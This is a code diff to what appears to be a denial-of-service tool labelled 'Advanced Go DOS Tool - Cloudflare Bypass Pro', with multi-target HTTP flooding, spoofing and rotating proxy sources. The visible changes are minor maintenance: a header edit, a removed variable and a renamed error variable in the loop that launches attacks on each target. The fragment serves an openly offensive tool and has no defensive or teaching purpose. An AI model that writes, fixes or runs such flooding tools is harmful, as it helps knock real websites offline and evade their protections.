@@ -3,7 +3,7 @@
 # ----------------------------------------
 # ADVANCED GO DOS TOOL - CLOUDFLARE BYPASS PRO
 # MULTI-TARGET + HTTP/2 + HTTP/1.1 + Advanced Spoofing
-# WITH 6 PROXY API SOURCES - FIXED VERSION
+# WITH 6 PROXY API SOURCES - FULLY FIXED
 # ----------------------------------------
 
 # Color definitions
@@ -159,7 +159,6 @@ var (
 	proxies         []string
 	proxyMu         sync.RWMutex
 	proxyIndex      uint64
-	currentProxyAPI int
 	
 	// 6 Different Proxy API Sources
 	proxyAPIs = []string{
@@ -862,8 +861,8 @@ func main() {
 	// Start attack for each target
 	targetList := make([]Target, len(targets))
 	for i, t := range targets {
-		durationSec, err := strconv.Atoi(t.Duration)
-		if err != nil {
+		durationSec, convErr := strconv.Atoi(t.Duration)
+		if convErr != nil {
 			fmt.Printf("Invalid duration for target %s: %s\n", t.URL, t.Duration)
 			continue
 		}
